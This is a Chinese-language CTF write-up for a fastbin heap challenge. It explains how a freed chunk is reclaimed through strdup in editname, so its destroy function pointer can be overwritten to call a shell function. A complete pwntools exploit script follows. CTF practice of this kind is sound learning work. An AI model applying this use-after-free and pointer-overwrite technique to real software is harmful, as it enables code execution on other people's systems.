# level2
### 思路
1. pool数组中每个元素指向一个大小为0x38的堆块，其中0x30处指向的是destory函数，其功能是free堆块。只要能修改这个地址为hack，free的时候就可以调用shell。
2. 不管我们输多少，add_node()都会将最后8个bytes覆盖为desstory。add_note,delete_note,则这个堆块会被放到fastbin中.
3. editname中，会把传入的name进行strdup()操作，这个函数执行如下操作，
```
char *strdup(const char *s)
{
   size_t  len = strlen(s) +1;
   void *new = malloc(len);
   if (new == NULL)
      return NULL;
   return (char *)memecpy(new,s,len);
}

```
因此，只要name的长度大小合适，将重新malloc到第二步free的堆块，这时，就可以覆盖destory为hack了
4.再次free刚刚分配的堆块，就会调用hack

### exp
```python
from pwn import *
context.log_level="debug"
pwn_file="./level2-fastbin"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22502)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

hack_pos = 0x400826

def editname(name=""):
    r.recvuntil(">> ")
    r.sendline("4")
    r.recvuntil("Your name:")
    r.sendline(name)

def addnote(content = ''):
    r.recvuntil(">> ")
    r.sendline("1")
    r.recvuntil("Content: ")
    if content:
      r.sendline(content)
    else:
      r.sendline('abc')
    nid =  r.recvline("Note id:")
    return nid[-2:-1]

def deletenote(nid):
    r.recvuntil(">> ")
    r.sendline("3")
    r.recvuntil("Input your id:")
    r.sendline(nid)

r.recvuntil('Your name:')
r.sendline("www")

a= addnote()
deletenote(a)
editname("a"*48 + p64(0x4008B6)[:6])
deletenote(a)

r.interactive()
```